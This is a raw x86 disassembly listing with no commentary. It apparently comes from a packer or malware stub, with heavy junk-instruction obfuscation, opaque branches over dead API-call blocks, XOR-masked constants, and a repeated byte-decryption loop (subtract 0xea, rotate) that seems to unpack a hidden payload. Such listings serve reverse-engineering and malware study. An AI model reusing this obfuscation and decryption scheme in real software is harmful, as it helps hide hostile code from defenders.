  41d4ed:	mov    ebx,DWORD PTR ds:0x422996
  41d4f3:	mov    DWORD PTR ds:0x422976,0x477d
  41d4fd:	mov    DWORD PTR ds:0x4228c2,ebx
  41d503:	mov    DWORD PTR ds:0x4228ae,0x7a5c
  41d50d:	jmp    0x41d550
  41d512:	mov    ebx,0x5fbd
  41d517:	je     0x41d54c
  41d51d:	push   DWORD PTR [ebp-0x28]
  41d520:	push   0x41f8
  41d525:	push   0x6fc1
  41d52a:	push   DWORD PTR [ebp-0x24]
  41d52d:	call   DWORD PTR ds:0x42a05c
  41d533:	and    DWORD PTR ds:0x42296a,edi
  41d539:	sub    edi,esi
  41d53b:	mov    ebx,DWORD PTR ds:0x422a86
  41d541:	mov    esi,DWORD PTR ds:0x422a9a
  41d547:	sub    esi,ebx
  41d549:	sub    ebx,DWORD PTR [ebx+esi*1]
  41d54c:	sbb    edi,esi
  41d54e:	not    esi
  41d550:	mov    esi,0x2e9a655c
  41d555:	xor    eax,esi
  41d557:	cmp    DWORD PTR ds:0x422946,0x0
  41d55e:	mov    DWORD PTR ds:0x4229aa,ecx
  41d564:	mov    DWORD PTR ds:0x422936,0x719b
  41d56e:	mov    DWORD PTR ds:0x42290a,0x79d9
  41d578:	mov    DWORD PTR ds:0x4229ba,ecx
  41d57e:	jmp    0x41d607
  41d583:	mov    DWORD PTR ds:0x4229b6,0x57de
  41d58d:	mov    DWORD PTR ds:0x42298e,0x236c
  41d597:	ja     0x41d5d9
  41d59d:	push   0x3fc3
  41d5a2:	push   0x4225dc
  41d5a7:	call   DWORD PTR ds:0x42a060
  41d5ad:	sbb    ebx,DWORD PTR ds:0x42294a
  41d5b3:	mov    ebx,DWORD PTR ds:0x422892
  41d5b9:	adc    DWORD PTR ds:0x42289e,ebx
  41d5bf:	xor    ebx,ebx
  41d5c1:	or     ebx,DWORD PTR ds:0x422a7a
  41d5c7:	mov    ebx,DWORD PTR [ebx]
  41d5c9:	adc    DWORD PTR ds:0x4229d2,ebx
  41d5cf:	mov    DWORD PTR ds:0x4228ba,0x6b73
  41d5d9:	and    ebx,edi
  41d5db:	sub    edi,DWORD PTR ds:0x422972
  41d5e1:	adc    ebx,DWORD PTR ds:0x422922
  41d5e7:	movzx  ebx,BYTE PTR ds:0x422926
  41d5ee:	adc    DWORD PTR ds:0x42294e,ebx
  41d5f4:	mov    edi,DWORD PTR ds:0x4229da
  41d5fa:	xor    ebx,ebx
  41d5fc:	or     ebx,DWORD PTR ds:0x422a2e
  41d602:	sub    ebx,edi
  41d604:	or     edi,DWORD PTR [edi+ebx*1]
  41d607:	or     eax,edx
  41d609:	mov    DWORD PTR ds:0x4228fe,0x3549
  41d613:	mov    DWORD PTR [ebp-0x28],eax
  41d616:	mov    eax,DWORD PTR [ebp+0x8]
  41d619:	or     edx,0x76a
  41d61f:	shl    ecx,0x1e
  41d622:	cmp    DWORD PTR ds:0x4229aa,0x0
  41d629:	mov    DWORD PTR ds:0x42297e,ebx
  41d62f:	mov    ecx,DWORD PTR ds:0x4229be
  41d635:	mov    DWORD PTR ds:0x422962,0x9fe
  41d63f:	jmp    0x41d6aa
  41d644:	mov    DWORD PTR ds:0x4228de,edx
  41d64a:	mov    edx,DWORD PTR ds:0x4228ae
  41d650:	jae    0x41d68f
  41d656:	push   DWORD PTR [ebp-0x18]
  41d659:	push   DWORD PTR [ebp-0x18]
  41d65c:	call   DWORD PTR ds:0x42a064
  41d662:	mov    edx,DWORD PTR ds:0x422abe
  41d668:	mov    ecx,DWORD PTR ds:0x422ac6
  41d66e:	sub    edx,ecx
  41d670:	or     edx,DWORD PTR [edx+ecx*1]
  41d673:	mov    edi,DWORD PTR ds:0x4229ba
  41d679:	sbb    edi,DWORD PTR ds:0x4228ba
  41d67f:	mov    DWORD PTR ds:0x4229ba,edi
  41d685:	or     DWORD PTR ds:0x422966,0x5f8
  41d68f:	adc    DWORD PTR ds:0x42298e,0x1669
  41d699:	mov    ecx,DWORD PTR ds:0x422a52
  41d69f:	mov    ebx,DWORD PTR ds:0x422ac2
  41d6a5:	sub    ebx,ecx
  41d6a7:	or     ecx,DWORD PTR [ecx+ebx*1]
  41d6aa:	mov    ecx,DWORD PTR [ebp+0xc]
  41d6ad:	xor    edi,0x396f
  41d6b3:	shrd   eax,ecx,0x2
  41d6b7:	adc    DWORD PTR ds:0x42295a,edi
  41d6bd:	xor    eax,esi
  41d6bf:	adc    ebx,edi
  41d6c1:	shr    ecx,0x2
  41d6c4:	mov    ecx,DWORD PTR [ebp+0x8]
  41d6c7:	inc    ebx
  41d6c8:	mov    edx,DWORD PTR [ebp+0xc]
  41d6cb:	xor    edx,edx
  41d6cd:	xor    ebx,DWORD PTR ds:0x42295a
  41d6d3:	or     eax,edx
  41d6d5:	sub    edx,0x59e2
  41d6db:	mov    DWORD PTR [ebp-0x28],eax
  41d6de:	mov    eax,ds:0x4220e8
  41d6e3:	add    DWORD PTR ds:0x4228d2,edx
  41d6e9:	mov    eax,DWORD PTR [eax]
  41d6eb:	xor    DWORD PTR ds:0x42293a,0x4228c2
  41d6f5:	mov    DWORD PTR [ebp-0xc],eax
  41d6f8:	mov    eax,ds:0x422308
  41d6fd:	sub    ebx,0x7e01
  41d703:	mov    eax,DWORD PTR [eax]
  41d705:	mov    ebx,DWORD PTR ds:0x422a42
  41d70b:	xor    edi,edi
  41d70d:	xor    edi,DWORD PTR ds:0x422a9a
  41d713:	sub    edi,ebx
  41d715:	and    ebx,DWORD PTR [ebx+edi*1]
  41d718:	mov    DWORD PTR [ebp-0x10],eax
  41d71b:	cmp    DWORD PTR ds:0x4229c6,0x0
  41d722:	mov    DWORD PTR ds:0x42295a,ebx
  41d728:	mov    DWORD PTR ds:0x42297e,0x12ca
  41d732:	jmp    0x41d772
  41d737:	mov    DWORD PTR ds:0x4229c2,ebx
  41d73d:	jl     0x41d75a
  41d743:	push   0x4227af
  41d748:	call   DWORD PTR ds:0x42a180
  41d74e:	dec    DWORD PTR ds:0x4228de
  41d754:	or     edi,DWORD PTR ds:0x4229c6
  41d75a:	adc    DWORD PTR ds:0x422902,0x16ea
  41d764:	or     DWORD PTR ds:0x42291e,ecx
  41d76a:	neg    edi
  41d76c:	sbb    DWORD PTR ds:0x4228c6,edx
  41d772:	mov    eax,DWORD PTR [ebp-0xc]
  41d775:	or     eax,DWORD PTR ds:0x422936
  41d77b:	mov    eax,DWORD PTR [ebp-0xc]
  41d77e:	or     DWORD PTR ds:0x42297e,0xd91
  41d788:	shl    ecx,0x1e
  41d78b:	sub    DWORD PTR ds:0x4228da,0x4229c2
  41d795:	xor    ecx,ecx
  41d797:	adc    DWORD PTR ds:0x422972,ecx
  41d79d:	shld   ecx,eax,0x2
  41d7a1:	cmp    DWORD PTR ds:0x4229ba,0x0
  41d7a8:	movzx  ebx,BYTE PTR ds:0x422926
  41d7af:	mov    DWORD PTR ds:0x4228fe,0x7bb6
  41d7b9:	mov    DWORD PTR ds:0x422922,edi
  41d7bf:	movzx  ebx,BYTE PTR ds:0x422966
  41d7c6:	jmp    0x41d83f
  41d7cb:	mov    DWORD PTR ds:0x4229b6,0x5617
  41d7d5:	mov    DWORD PTR ds:0x4229ca,0x1a8d
  41d7df:	je     0x41d814
  41d7e5:	push   0x4228c6
  41d7ea:	push   0x422906
  41d7ef:	push   0x148f
  41d7f4:	call   DWORD PTR ds:0x42a068
  41d7fa:	xor    ebx,ebx
  41d7fc:	add    ebx,DWORD PTR ds:0x422a8a
  41d802:	mov    edx,DWORD PTR ds:0x422ada
  41d808:	sub    ebx,edx
  41d80a:	xor    ebx,DWORD PTR [ebx+edx*1]
  41d80d:	add    ebx,DWORD PTR ds:0x422906
  41d813:	inc    ebx
  41d814:	movzx  edx,BYTE PTR ds:0x42291e
  41d81b:	or     edx,DWORD PTR ds:0x42290e
  41d821:	mov    DWORD PTR ds:0x42291e,edx
  41d827:	mov    DWORD PTR ds:0x4228be,0x3c15
  41d831:	xor    edi,edi
  41d833:	add    edi,DWORD PTR ds:0x42296a
  41d839:	and    DWORD PTR ds:0x4229a2,edi
  41d83f:	mov    edi,DWORD PTR [ebp+0x8]
  41d842:	mov    ebx,DWORD PTR [ebp+0xc]
  41d845:	shl    eax,0x2
  41d848:	and    edx,DWORD PTR ds:0x422996
  41d84e:	mov    DWORD PTR [ebp-0x34],ebx
  41d851:	or     edx,DWORD PTR ds:0x422942
  41d857:	xor    ebx,ebx
  41d859:	or     edx,DWORD PTR ds:0x42297e
  41d85f:	mov    edx,0x9c0a89d8
  41d864:	xor    DWORD PTR ds:0x42293e,0x38e7
  41d86e:	xor    eax,0xba699573
  41d873:	xor    ecx,edx
  41d875:	mov    DWORD PTR ds:0x422966,0x5827
  41d87f:	inc    ebx
  41d880:	mov    DWORD PTR ds:0x42288e,0x1c53
  41d88a:	mov    DWORD PTR [ebp-0x1c],0xa3e69b9d
  41d891:	mov    DWORD PTR ds:0x42296a,0x3d21
  41d89b:	mov    DWORD PTR [ebp-0x18],0xa3e6929d
  41d8a2:	mov    DWORD PTR ds:0x4228d6,0x742f
  41d8ac:	cmp    eax,edi
  41d8ae:	mov    DWORD PTR ds:0x42289e,0x5996
  41d8b8:	jne    0x41d8db
  41d8be:	mov    DWORD PTR ds:0x4228e2,0x7e38
  41d8c8:	cmp    ecx,DWORD PTR [ebp-0x34]
  41d8cb:	mov    DWORD PTR ds:0x422976,0x4e71
  41d8d5:	je     0x41de74
  41d8db:	xor    edi,edi
  41d8dd:	mov    eax,DWORD PTR [ebp-0x10]
  41d8e0:	mov    eax,DWORD PTR [ebp-0x10]
  41d8e3:	and    edi,0x18bc
  41d8e9:	xor    ecx,ecx
  41d8eb:	shld   ecx,eax,0x2
  41d8ef:	cmp    DWORD PTR ds:0x4228a6,0x0
  41d8f6:	not    edi
  41d8f8:	mov    DWORD PTR ds:0x422916,0x65a0
  41d902:	mov    edi,DWORD PTR ds:0x4229c6
  41d908:	jmp    0x41d962
  41d90d:	mov    DWORD PTR ds:0x42291e,0x42bf
  41d917:	jl     0x41d942
  41d91d:	push   DWORD PTR [ebp-0x18]
  41d920:	call   DWORD PTR ds:0x42a184
  41d926:	mov    edi,DWORD PTR ds:0x42292a
  41d92c:	xor    DWORD PTR ds:0x42297e,edi
  41d932:	add    edi,DWORD PTR ds:0x422926
  41d938:	and    DWORD PTR ds:0x42296e,0x3699
  41d942:	sub    DWORD PTR ds:0x4229d2,ecx
  41d948:	xor    DWORD PTR ds:0x42291a,0x37de
  41d952:	sbb    edi,0x14bf
  41d958:	sbb    DWORD PTR ds:0x422906,0x2f26
  41d962:	shl    eax,0x2
  41d965:	xor    ecx,edx
  41d967:	mov    edx,DWORD PTR [ebp+0x8]
  41d96a:	cmp    DWORD PTR ds:0x4228f6,0x0
  41d971:	mov    DWORD PTR ds:0x4229b2,0x11be
  41d97b:	mov    edi,DWORD PTR ds:0x42298a
  41d981:	mov    edi,0x436a
  41d986:	mov    edi,0x787d
  41d98b:	jmp    0x41d9f6
  41d990:	mov    DWORD PTR ds:0x42294e,ecx
  41d996:	jne    0x41d9c9
  41d99c:	push   0x58ed
  41d9a1:	push   DWORD PTR [ebp-0xc]
  41d9a4:	push   0x4fe0
  41d9a9:	call   DWORD PTR ds:0x42a188
  41d9af:	sub    DWORD PTR ds:0x4228c2,0x42290a
  41d9b9:	inc    DWORD PTR ds:0x422916
  41d9bf:	sub    DWORD PTR ds:0x4228f2,0x2f59
  41d9c9:	movzx  edi,BYTE PTR ds:0x42295e
  41d9d0:	or     edi,DWORD PTR ds:0x4229b6
  41d9d6:	mov    DWORD PTR ds:0x42295e,edi
  41d9dc:	sub    DWORD PTR ds:0x4229c2,edx
  41d9e2:	adc    DWORD PTR ds:0x42299a,0x4229a2
  41d9ec:	and    DWORD PTR ds:0x4228be,0x217e
  41d9f6:	mov    edi,DWORD PTR [ebp+0xc]
  41d9f9:	xor    eax,0xba699573
  41d9fe:	mov    DWORD PTR ds:0x4229ae,0x94b
  41da08:	cmp    eax,edx
  41da0a:	mov    DWORD PTR ds:0x4229be,0x7ea4
  41da14:	jne    0x41da2c
  41da1a:	mov    DWORD PTR ds:0x4228ee,0x77f8
  41da24:	cmp    ecx,edi
  41da26:	je     0x41de74
  41da2c:	cmp    DWORD PTR ds:0x42292a,0x0
  41da33:	mov    DWORD PTR ds:0x4228e6,0x4ba6
  41da3d:	mov    DWORD PTR ds:0x42289e,0x1c76
  41da47:	jmp    0x41daaa
  41da4c:	mov    ecx,DWORD PTR ds:0x422892
  41da52:	mov    DWORD PTR ds:0x422892,0x488a
  41da5c:	jg     0x41da91
  41da62:	push   0x42298a
  41da67:	push   DWORD PTR [ebp-0xc]
  41da6a:	push   0x422737
  41da6f:	push   0x58d5
  41da74:	call   DWORD PTR ds:0x42a18c
  41da7a:	mov    ecx,DWORD PTR ds:0x42299a
  41da80:	sbb    DWORD PTR ds:0x4229aa,ecx
  41da86:	xor    DWORD PTR ds:0x422986,0x108
  41da90:	dec    ecx
  41da91:	sbb    ecx,DWORD PTR ds:0x4229c2
  41da97:	mov    ecx,DWORD PTR ds:0x422aa6
  41da9d:	xor    edi,edi
  41da9f:	xor    edi,DWORD PTR ds:0x422aee
  41daa5:	sub    ecx,edi
  41daa7:	add    ecx,DWORD PTR [ecx+edi*1]
  41daaa:	mov    eax,DWORD PTR [ebp-0x18]
  41daad:	adc    DWORD PTR ds:0x422922,0x2ce9
  41dab7:	mov    ecx,DWORD PTR [ebp-0x18]
  41daba:	neg    edi
  41dabc:	xor    ecx,ebx
  41dabe:	shl    ecx,0x1e
  41dac1:	sbb    DWORD PTR ds:0x4229b2,edx
  41dac7:	mov    edi,0xa3e69a9f
  41dacc:	xor    eax,edi
  41dace:	shr    eax,0x2
  41dad1:	or     DWORD PTR ds:0x42298a,0x42289a
  41dadb:	or     eax,ecx
  41dadd:	cmp    DWORD PTR ds:0x42299a,0x0
  41dae4:	movzx  ecx,WORD PTR ds:0x42293a
  41daeb:	not    ecx
  41daed:	jmp    0x41db51
  41daf2:	mov    DWORD PTR ds:0x4229d2,0x1c9
  41dafc:	je     0x41db2b
  41db02:	push   0x1982
  41db07:	call   DWORD PTR ds:0x42a2a4
  41db0d:	sub    ecx,0x256c
  41db13:	sub    DWORD PTR ds:0x4229d2,edx
  41db19:	mov    ecx,DWORD PTR ds:0x4229ca
  41db1f:	or     DWORD PTR ds:0x42297a,ecx
  41db25:	add    DWORD PTR ds:0x42293e,edx
  41db2b:	xor    ecx,0x2a90
  41db31:	adc    ecx,DWORD PTR ds:0x4228e2
  41db37:	xor    DWORD PTR ds:0x4228c2,edx
  41db3d:	xor    ecx,ecx
  41db3f:	or     ecx,DWORD PTR ds:0x4228e2
  41db45:	and    DWORD PTR ds:0x4228f6,ecx
  41db4b:	sbb    DWORD PTR ds:0x422932,edx
  41db51:	mov    DWORD PTR [ebp-0x34],eax
  41db54:	xor    ecx,0x70df
  41db5a:	mov    eax,ds:0x422268
  41db5f:	mov    ecx,DWORD PTR ds:0x4228d2
  41db65:	adc    ecx,DWORD PTR ds:0x422976
  41db6b:	mov    DWORD PTR ds:0x4228d2,ecx
  41db71:	mov    DWORD PTR [ebp-0x34],eax
  41db74:	xor    eax,eax
  41db76:	xor    eax,DWORD PTR ds:0x4228a6
  41db7c:	sbb    DWORD PTR ds:0x42294a,eax
  41db82:	mov    eax,DWORD PTR [ebp-0xc]
  41db85:	cmp    DWORD PTR ds:0x4229c6,0x0
  41db8c:	mov    DWORD PTR ds:0x4228fe,0x1213
  41db96:	movzx  ecx,WORD PTR ds:0x4228b2
  41db9d:	jmp    0x41dc0a
  41dba2:	mov    DWORD PTR ds:0x42298a,0x52a1
  41dbac:	mov    DWORD PTR ds:0x422962,edx
  41dbb2:	jg     0x41dbe7
  41dbb8:	push   DWORD PTR [ebp-0x24]
  41dbbb:	push   0x4008
  41dbc0:	push   0x37a6
  41dbc5:	call   DWORD PTR ds:0x42a06c
  41dbcb:	and    ecx,DWORD PTR ds:0x422946
  41dbd1:	sub    DWORD PTR ds:0x42291a,ebx
  41dbd7:	adc    DWORD PTR ds:0x4228e6,edx
  41dbdd:	xor    DWORD PTR ds:0x42290a,0x1acd
  41dbe7:	dec    ecx
  41dbe8:	add    DWORD PTR ds:0x42289a,0x219e
  41dbf2:	mov    ecx,DWORD PTR ds:0x4228fa
  41dbf8:	and    DWORD PTR ds:0x42291a,ecx
  41dbfe:	mov    ecx,DWORD PTR ds:0x4228e6
  41dc04:	or     DWORD PTR ds:0x4228ae,ecx
  41dc0a:	mov    DWORD PTR [ebp-0x14],eax
  41dc0d:	cmp    DWORD PTR ds:0x42299a,0x0
  41dc14:	mov    DWORD PTR ds:0x4228f6,0x5b1a
  41dc1e:	mov    ecx,0x5f2a
  41dc23:	jmp    0x41dc56
  41dc28:	mov    DWORD PTR ds:0x422922,0x1bb2
  41dc32:	jg     0x41dc49
  41dc38:	push   DWORD PTR [ebp-0x1c]
  41dc3b:	call   DWORD PTR ds:0x42a190
  41dc41:	or     ecx,ecx
  41dc43:	add    ecx,DWORD PTR ds:0x4228ba
  41dc49:	xor    ecx,ecx
  41dc4b:	dec    ecx
  41dc4c:	or     DWORD PTR ds:0x4228de,0x336d
  41dc56:	mov    ecx,DWORD PTR [ebp-0x14]
  41dc59:	push   0x4
  41dc5b:	pop    eax
  41dc5c:	sub    eax,ecx
  41dc5e:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc61:	add    ecx,eax
  41dc63:	mov    DWORD PTR [ebp-0x24],ecx
  41dc66:	lea    eax,[ebp-0x30]
  41dc69:	mov    DWORD PTR [ebp-0x2c],eax
  41dc6c:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc6f:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc72:	xor    eax,edi
  41dc74:	xor    ecx,ebx
  41dc76:	shr    eax,0x2
  41dc79:	shl    ecx,0x1e
  41dc7c:	or     eax,ecx
  41dc7e:	mov    DWORD PTR [ebp-0x20],eax
  41dc81:	mov    DWORD PTR [ebp-0x8],0xa3e69a8d
  41dc88:	mov    eax,DWORD PTR [ebp-0x8]
  41dc8b:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc8e:	xor    eax,edi
  41dc90:	xor    ecx,ebx
  41dc92:	shr    eax,0x2
  41dc95:	shl    ecx,0x1e
  41dc98:	or     ecx,eax
  41dc9a:	push   ecx
  41dc9b:	lea    eax,[ebp-0x8]
  41dc9e:	push   eax
  41dc9f:	lea    eax,[ebp-0x7c]
  41dca2:	push   eax
  41dca3:	call   0x41d2e9
  41dca8:	mov    eax,DWORD PTR [ebp-0x8]
  41dcab:	mov    ecx,DWORD PTR [ebp-0x8]
  41dcae:	xor    eax,edi
  41dcb0:	xor    ecx,ebx
  41dcb2:	shr    eax,0x2
  41dcb5:	shl    ecx,0x1e
  41dcb8:	or     ecx,eax
  41dcba:	push   ecx
  41dcbb:	lea    eax,[ebp-0x14]
  41dcbe:	push   eax
  41dcbf:	mov    eax,DWORD PTR [ebp+0x8]
  41dcc2:	mov    ecx,DWORD PTR [ebp+0xc]
  41dcc5:	shrd   eax,ecx,0x2
  41dcc9:	shr    ecx,0x2
  41dccc:	mov    ecx,DWORD PTR [ebp+0x8]
  41dccf:	mov    edx,DWORD PTR [ebp+0xc]
  41dcd2:	xor    eax,esi
  41dcd4:	xor    edx,edx
  41dcd6:	or     eax,edx
  41dcd8:	lea    eax,[ebp+eax*4-0x78]
  41dcdc:	push   eax
  41dcdd:	shl    ecx,0x1e
  41dce0:	call   0x41d2e9
  41dce5:	mov    eax,DWORD PTR [ebp-0x8]
  41dce8:	mov    ecx,DWORD PTR [ebp-0x8]
  41dceb:	xor    eax,edi
  41dced:	xor    ecx,ebx
  41dcef:	shr    eax,0x2
  41dcf2:	shl    ecx,0x1e
  41dcf5:	or     ecx,eax
  41dcf7:	push   ecx
  41dcf8:	lea    eax,[ebp-0x24]
  41dcfb:	push   eax
  41dcfc:	mov    eax,DWORD PTR [ebp+0x10]
  41dcff:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd02:	shrd   eax,ecx,0x2
  41dd06:	shr    ecx,0x2
  41dd09:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd0c:	mov    edx,DWORD PTR [ebp+0x14]
  41dd0f:	xor    eax,esi
  41dd11:	xor    edx,edx
  41dd13:	or     eax,edx
  41dd15:	lea    eax,[ebp+eax*4-0x78]
  41dd19:	push   eax
  41dd1a:	shl    ecx,0x1e
  41dd1d:	call   0x41d2e9
  41dd22:	mov    eax,DWORD PTR [ebp-0x8]
  41dd25:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd28:	xor    ecx,ebx
  41dd2a:	xor    eax,edi
  41dd2c:	shl    ecx,0x1e
  41dd2f:	shr    eax,0x2
  41dd32:	or     ecx,eax
  41dd34:	push   ecx
  41dd35:	lea    eax,[ebp-0x20]
  41dd38:	push   eax
  41dd39:	mov    eax,DWORD PTR [ebp+0x10]
  41dd3c:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd3f:	shrd   eax,ecx,0x2
  41dd43:	shr    ecx,0x2
  41dd46:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd49:	mov    edx,DWORD PTR [ebp+0x14]
  41dd4c:	xor    edx,edx
  41dd4e:	xor    eax,esi
  41dd50:	or     eax,edx
  41dd52:	shl    ecx,0x1e
  41dd55:	mov    ecx,DWORD PTR [ebp+0x10]
  41dd58:	mov    edx,DWORD PTR [ebp+0x14]
  41dd5b:	shrd   ecx,edx,0x2
  41dd5f:	shr    edx,0x2
  41dd62:	mov    edx,DWORD PTR [ebp+0x10]
  41dd65:	mov    ebx,DWORD PTR [ebp+0x14]
  41dd68:	xor    ecx,esi
  41dd6a:	xor    ebx,ebx
  41dd6c:	or     ecx,ebx
  41dd6e:	add    eax,ecx
  41dd70:	lea    eax,[ebp+eax*4-0x78]
  41dd74:	push   eax
  41dd75:	shl    edx,0x1e
  41dd78:	call   0x41d2e9
  41dd7d:	mov    eax,DWORD PTR [ebp-0x8]
  41dd80:	mov    ecx,DWORD PTR [ebp-0x8]
  41dd83:	xor    ecx,0x1
  41dd86:	shl    ecx,0x1e
  41dd89:	xor    eax,edi
  41dd8b:	shr    eax,0x2
  41dd8e:	or     ecx,eax
  41dd90:	push   ecx
  41dd91:	lea    eax,[ebp-0x2c]
  41dd94:	push   eax
  41dd95:	mov    eax,DWORD PTR [ebp+0x10]
  41dd98:	mov    ecx,DWORD PTR [ebp+0x14]
  41dd9b:	shrd   eax,ecx,0x2
  41dd9f:	shr    ecx,0x2
  41dda2:	mov    ecx,DWORD PTR [ebp+0x10]
  41dda5:	mov    edx,DWORD PTR [ebp+0x14]
  41dda8:	xor    edx,edx
  41ddaa:	shl    ecx,0x1e
  41ddad:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddb0:	xor    eax,esi
  41ddb2:	or     eax,edx
  41ddb4:	mov    edx,DWORD PTR [ebp+0x14]
  41ddb7:	shrd   ecx,edx,0x2
  41ddbb:	shr    edx,0x2
  41ddbe:	mov    edx,DWORD PTR [ebp+0x10]
  41ddc1:	mov    ebx,DWORD PTR [ebp+0x14]
  41ddc4:	xor    ecx,esi
  41ddc6:	xor    ebx,ebx
  41ddc8:	or     ecx,ebx
  41ddca:	shl    edx,0x1e
  41ddcd:	add    eax,ecx
  41ddcf:	mov    ecx,DWORD PTR [ebp+0x10]
  41ddd2:	mov    edx,DWORD PTR [ebp+0x14]
  41ddd5:	shrd   ecx,edx,0x2
  41ddd9:	shr    edx,0x2
  41dddc:	mov    edx,DWORD PTR [ebp+0x10]
  41dddf:	mov    ebx,DWORD PTR [ebp+0x14]
  41dde2:	xor    ecx,esi
  41dde4:	xor    ebx,ebx
  41dde6:	or     ecx,ebx
  41dde8:	add    eax,ecx
  41ddea:	lea    eax,[ebp+eax*4-0x78]
  41ddee:	push   eax
  41ddef:	shl    edx,0x1e
  41ddf2:	call   0x41d2e9
  41ddf7:	mov    eax,DWORD PTR [ebp-0x7c]
  41ddfa:	mov    ecx,DWORD PTR [ebp-0x7c]
  41ddfd:	xor    eax,edi
  41ddff:	shr    eax,0x2
  41de02:	inc    ebx
  41de03:	xor    ecx,ebx
  41de05:	shl    ecx,0x1e
  41de08:	or     ecx,eax
  41de0a:	mov    DWORD PTR [ebp-0x7c],ecx
  41de0d:	lea    eax,[ebp-0x7c]
  41de10:	push   eax
  41de11:	mov    eax,DWORD PTR [ebp+0x10]
  41de14:	mov    ecx,DWORD PTR [ebp+0x14]
  41de17:	shrd   eax,ecx,0x2
  41de1b:	shr    ecx,0x2
  41de1e:	mov    ecx,DWORD PTR [ebp+0x10]
  41de21:	mov    edx,DWORD PTR [ebp+0x14]
  41de24:	xor    eax,esi
  41de26:	xor    edx,edx
  41de28:	or     eax,edx
  41de2a:	push   eax
  41de2b:	mov    eax,ds:0x422298
  41de30:	mov    edi,0x4221de
  41de35:	push   edi
  41de36:	push   DWORD PTR [eax]
  41de38:	shl    ecx,0x1e
  41de3b:	call   0x41f816
  41de40:	lea    eax,[ebp-0x7c]
  41de43:	push   eax
  41de44:	mov    eax,DWORD PTR [ebp+0x10]
  41de47:	mov    ecx,DWORD PTR [ebp+0x14]
  41de4a:	shrd   eax,ecx,0x2
  41de4e:	shr    ecx,0x2
  41de51:	mov    ecx,DWORD PTR [ebp+0x10]
  41de54:	mov    edx,DWORD PTR [ebp+0x14]
  41de57:	xor    eax,esi
  41de59:	xor    edx,edx
  41de5b:	or     eax,edx
  41de5d:	push   eax
  41de5e:	mov    eax,ds:0x422298
  41de63:	push   edi
  41de64:	push   DWORD PTR [eax]
  41de66:	shl    ecx,0x1e
  41de69:	call   0x41f816
  41de6e:	mov    eax,DWORD PTR [ebp-0x30]
  41de71:	mov    eax,DWORD PTR [ebp-0x20]
  41de74:	mov    edi,DWORD PTR [ebp-0x14]
  41de77:	mov    eax,DWORD PTR [ebp-0x24]
  41de7a:	mov    ecx,edi
  41de7c:	mov    DWORD PTR [ebp-0x18],eax
  41de7f:	rol    ecx,0x2
  41de82:	mov    eax,0xa3e69a9d
  41de87:	xor    ecx,eax
  41de89:	cmp    ecx,eax
  41de8b:	je     0x41df6d
  41de91:	mov    DWORD PTR [ebp-0x1c],0x1001
  41de98:	mov    ecx,DWORD PTR [ebp-0x18]
  41de9b:	xor    eax,eax
  41de9d:	mov    DWORD PTR [ebp-0x34],ecx
  41dea0:	test   ecx,ecx
  41dea2:	je     0x41dece
  41dea8:	mov    cl,BYTE PTR [eax+edi*1]
  41deab:	mov    BYTE PTR [ebp-0x1],cl
  41deae:	movzx  ecx,BYTE PTR [ebp-0x1]
  41deb2:	sub    ecx,0xea
  41deb8:	mov    BYTE PTR [ebp-0x1],cl
  41debb:	ror    BYTE PTR [ebp-0x1],1
  41debe:	mov    cl,BYTE PTR [ebp-0x1]
  41dec1:	mov    BYTE PTR [eax+edi*1],cl
  41dec4:	inc    eax
  41dec5:	cmp    eax,DWORD PTR [ebp-0x34]
  41dec8:	jb     0x41dea8
  41dece:	dec    DWORD PTR [ebp-0x1c]
  41ded1:	jne    0x41de98
  41ded7:	mov    eax,DWORD PTR [ebp+0x8]
  41deda:	mov    ecx,DWORD PTR [ebp+0xc]
  41dedd:	shrd   eax,ecx,0x2
  41dee1:	shr    ecx,0x2
  41dee4:	mov    ecx,DWORD PTR [ebp+0x8]
  41dee7:	mov    edx,DWORD PTR [ebp+0xc]
  41deea:	xor    eax,esi
  41deec:	xor    edx,edx
  41deee:	or     eax,edx
  41def0:	push   ebx
  41def1:	add    eax,edi
  41def3:	push   eax
  41def4:	lea    eax,[ebp-0x2]
  41def7:	push   eax
  41def8:	shl    ecx,0x1e
  41defb:	call   0x41d2e9
  41df00:	mov    eax,DWORD PTR [ebp+0x10]
  41df03:	mov    ecx,DWORD PTR [ebp+0x14]
  41df06:	shrd   eax,ecx,0x2
  41df0a:	shr    ecx,0x2
  41df0d:	mov    ecx,DWORD PTR [ebp+0x10]
  41df10:	mov    edx,DWORD PTR [ebp+0x14]
  41df13:	xor    eax,esi
  41df15:	xor    edx,edx
  41df17:	or     eax,edx
  41df19:	add    eax,edi
  41df1b:	push   ebx
  41df1c:	push   eax
  41df1d:	mov    eax,DWORD PTR [ebp+0x8]
  41df20:	shl    ecx,0x1e
  41df23:	mov    ecx,DWORD PTR [ebp+0xc]
  41df26:	shrd   eax,ecx,0x2
  41df2a:	shr    ecx,0x2
  41df2d:	mov    ecx,DWORD PTR [ebp+0x8]
  41df30:	mov    edx,DWORD PTR [ebp+0xc]
  41df33:	xor    eax,esi
  41df35:	xor    edx,edx
  41df37:	or     eax,edx
  41df39:	add    eax,edi
  41df3b:	push   eax
  41df3c:	shl    ecx,0x1e
  41df3f:	call   0x41d2e9
  41df44:	push   ebx
  41df45:	lea    eax,[ebp-0x2]
  41df48:	push   eax
  41df49:	mov    eax,DWORD PTR [ebp+0x10]
  41df4c:	mov    ecx,DWORD PTR [ebp+0x14]
  41df4f:	shrd   eax,ecx,0x2
  41df53:	shr    ecx,0x2
  41df56:	mov    ecx,DWORD PTR [ebp+0x10]
  41df59:	mov    edx,DWORD PTR [ebp+0x14]
  41df5c:	xor    eax,esi
  41df5e:	xor    edx,edx
  41df60:	or     eax,edx
  41df62:	add    eax,edi
  41df64:	push   eax
  41df65:	shl    ecx,0x1e
  41df68:	call   0x41d2e9
  41df6d:	mov    eax,DWORD PTR [ebp+0x10]
  41df70:	mov    ecx,DWORD PTR [ebp+0x14]
  41df73:	shrd   eax,ecx,0x2
  41df77:	shr    ecx,0x2
  41df7a:	mov    ecx,DWORD PTR [ebp+0x10]
  41df7d:	mov    edx,DWORD PTR [ebp+0x14]
  41df80:	pop    edi
  41df81:	xor    eax,esi
